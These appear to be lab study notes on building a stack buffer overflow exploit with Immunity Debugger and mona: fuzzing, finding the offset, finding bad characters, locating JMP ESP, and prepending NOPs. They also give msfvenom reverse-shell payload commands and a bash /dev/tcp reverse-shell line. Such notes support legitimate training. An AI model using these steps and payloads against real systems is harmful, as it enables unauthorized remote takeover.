# methodology

## Getting MSP and EIP



Run Immunity Debugger as administrator

Configure Mona working folder using `!mona config -set workingfolder c:\kashz\%p`

Run `fuzzer.py` and note the crash byte number

set PAYLOAD = Generate pattern 400 bytes more than crash using

```
msf-pattern_create -l <number>
```



Run `exploit.py` and find offset

```
!mona findmsp -distance <number> 
OR
msf-pattern_offset -l <number> -q <EIP>

# should show in log windows as 
EIP contains normal pattern : 0x6f43396e (offset 1978)
```



set OFFSET, clear PAYLOAD, set RETURN = iiii (69696969). Run `exploit.py`

EIP` (should be) =`69696969

## Finding BadChars



Generate byte-array using mona excluding the `\x00` null byte

```
!mona bytearray -cpb "\x00"
```

set PAYLAOD = (byte-array). Run

Note ESP and run

```
!mona compare -f C:\kashz\bytearray.bin -a <ESP_address>
Use mona memory corruption and look at all 
```

Remove bad-char from mona byte-array and PAYLOAD 4.2. Status = unmodified

## Finding JMP

Locate all JMP ESPs

```
!mona jmp -r esp -cpb "\x00\xXX"
# little endian style backwards
```

set RETN =

## PAYLOAD

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=6969 EXITFUNC=thread -b "<badChars>" -f c
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=6969 EXITFUNC=thread -b "<badChars>" -f c

# windows under linux (wine)
bash -i >& /dev/tcp/IP/PORT 0>&1
```

## Prepend NOPs (\x90)

```
# as an encoder was used, space in memory is needed to unpack
padding = ""\x90" * 16
```
